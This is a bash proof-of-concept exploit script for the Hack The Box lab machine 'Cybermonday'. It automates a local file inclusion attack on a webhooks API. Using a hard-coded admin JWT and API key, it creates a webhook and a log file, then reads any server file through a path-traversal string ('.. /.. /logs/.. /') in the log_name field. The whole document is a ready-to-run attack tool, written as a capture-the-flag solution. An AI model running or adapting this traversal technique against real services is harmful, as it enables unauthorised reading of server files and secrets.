#!/bin/bash

# HTB Cybermonday
# ---------------
# Description: LFI by log files name API misconfiguration
# Author: Marss
# Date: 11 Nov, 2023

# Ctrl + c
# (function)
signal_handler(){
    echo -e "\n[!] User aborted."
    exit 1
}
# (signal)
trap signal_handler SIGINT

# Help panel
help_panel(){
    echo -e "\n| Cybermonday LFI PoC |"
    echo
    echo -e "[*] Usage: $0 -f <filename>"
}

# Needed data
jwt_token='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJtYXJzcyIsInJvbGUiOiJhZG1pbiJ9.3O-gYFD9-byFP4HeFtPEKzni8pZVooa-WziKg3r-NIo'
api_key='22892e36-1770-11ee-be56-0242ac120002'
temp_name=$(echo $RANDOM | md5sum | head -c 10)

# Functions
create_webhook(){
    response=$(curl -s -XPOST http://webhooks-api-beta.cybermonday.htb/webhooks/create \
            -H "Content-Type: application/json" \
            -H "x-access-token: $jwt_token" \
            -d "{\"name\":\"$temp_name\",\"description\":\"$temp_name\",\"action\":\"createLogFile\"}")
    echo $response | jq .webhook_uuid | tr -d '"'
}

create_log(){
    uuid=$1
    response=$(curl -s -XPOST http://webhooks-api-beta.cybermonday.htb/webhooks/$uuid \
            -H "Content-Type: application/json" \
            -H "x-access-token: $jwt_token" \
            -d "{\"log_name\":\"$temp_name\",\"log_content\":\"$temp_name\"}")
}

read_file(){
    uuid=$1
    response=$(curl -s -XPOST http://webhooks-api-beta.cybermonday.htb/webhooks/$uuid/logs \
            -H "Content-Type: application/json" \
            -H "x-access-token: $jwt_token" \
            -H "x-api-key: $api_key" \
            -d "{\"action\":\"read\",\"log_name\":\".. /.. /logs/.. /$filename\"}")
    echo $response | jq .message | tr -d '"' | sed 's/\\n/\n/g'
}

# Main flow
if [ "$#" -eq 0 ]; then
    help_panel; exit 1
fi

while getopts ":hf:" opt
do
    case $opt in
        h)
            help_panel; exit 0;;
        f)
            filename=$OPTARG;
            webhook_uuid=$(create_webhook)
            create_log $webhook_uuid
            read_file $webhook_uuid;;
        \?)
            echo -e "\n[x] Error: Invalid option"; exit 1;;
    esac
done
